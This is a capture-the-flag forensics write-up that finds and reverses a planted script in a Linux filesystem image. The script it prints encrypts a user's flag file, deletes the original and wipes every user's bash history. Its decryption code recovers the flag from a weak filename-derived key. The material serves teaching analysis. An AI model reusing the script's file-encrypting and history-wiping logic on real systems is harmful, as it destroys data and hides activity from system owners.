# Challenge: EZLinuxChall
## Information
<img width="1072" height="274" alt="image" src="https://github.com/user-attachments/assets/1953ffea-2684-4d35-a3e1-ee1219976f85" />

## Solution
Upon extracting the archive, we encounter a massive Linux root filesystem.  
We use targeted filtering based on the challenge hint, filter the filesystem for keywords like league, riot, and lol to identify suspicious files:
```bash
grep -rnE "league|riot|lol" . 2>/dev/null 
```

The search reveals a highly suspicious Python script located at `./root/usr/bin/league/install.py`. Check it:
```python
#!/usr/bin/env python3
import os
import random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

IV = b"iamnottheivuneed"

def find_flag():
    for user in os.listdir("/home"):
        home = os.path.join("/home", user)
        if os.path.isdir(home):
            p = os.path.join(home, "flag.txt")
            if os.path.isfile(p):
                return p
    return None

def collect_txt_filenames():
    names = []
    for user in os.listdir("/home"):
        home = os.path.join("/home", user)
        if not os.path.isdir(home):
            continue
        for f in os.listdir(home):
            p = os.path.join(home, f)
            if os.path.isfile(p) and f.lower().endswith(".txt") and f != "flag.txt":
                names.append(f.encode("utf-8", errors="ignore"))
    return names

def normalize_key_ascii0(name: bytes) -> bytes:
    if len(name) < 32:
        return b"0" * (32 - len(name)) + name
    return name[:32]

def wipe_bash_history():
    for user in os.listdir("/home"):
        hist = os.path.join("/home", user, ".bash_history")
        if os.path.exists(hist):
            try:
                open(hist, "w").close()
            except Exception:
                pass

def main():
    flag_path = find_flag()
    if not flag_path:
        return

    candidates = collect_txt_filenames()
    if not candidates:
        return

    chosen = random.choice(candidates)
    key = normalize_key_ascii0(chosen)

    with open(flag_path, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, IV)
    enc = cipher.encrypt(pad(data, AES.block_size))

    with open(flag_path + ".enc", "wb") as f:
        f.write(enc)

    try:
        os.remove(flag_path)
    except Exception:
        pass

    wipe_bash_history()

if __name__ == "__main__":
    main()
```

Encryption details:
- Algorithm: AES-256-CBC.
- IV: `b"iamnottheivuneed"`.
- The script picks a random `.txt` filename from the `/home` directory and pads it to 32 bytes using the character `0`.
- The original `flag.txt` is deleted, and only `flag.txt.enc` remains.

To solve it, we need to find the Key: `find root/home -name "flag.txt.enc"`.  

Fortunately, we get the goal that is file `root/home/mrhopz/flag.txt.enc`.  

Now, the Key is contained in one of the other files `.txt` in folder `/home`. Therefore, check all files `.txt` in `/home` (except `flag.txt`):
```bash
find root/home -name "*.txt" ! -name "flag.txt"
```

Two files maybe we need to check appeared: `nothing.txt` and `hello.txt`.  

We extract the raw hex data from the encrypted file: `xxd root/home/mrhopz/flag.txt.enc`

<img width="812" height="98" alt="image" src="https://github.com/user-attachments/assets/a8f8789a-7560-4152-a873-5eead97d0036" />

From this output, we obtain the full ciphertext string: `6f41c47a6d86d7b03dec4cba6d87dedb4f045b8ed25eb09f32e67dbfeeba1f93`

Since there are only two candidates, we use a Python script to attempt decryption with both filenames:
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

ciphertext = bytes.fromhex("6f41c47a6d86d7b03dec4cba6d87dedb4f045b8ed25eb09f32e67dbfeeba1f93")
iv = b"iamnottheivuneed"
candidates = ["nothing.txt", "hello.txt"]

def normalize_key(name):
    name_bytes = name.encode()
    return b"0" * (32 - len(name_bytes)) + name_bytes if len(name_bytes) < 32 else name_bytes[:32]

for filename in candidates:
    try:
        key = normalize_key(filename)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
        print(f"Flag: {decrypted.decode()}")
    except:
        continue
```

<img width="812" height="55" alt="image" src="https://github.com/user-attachments/assets/2a05cb91-d716-4de6-b1b7-f7ce885086b7" />
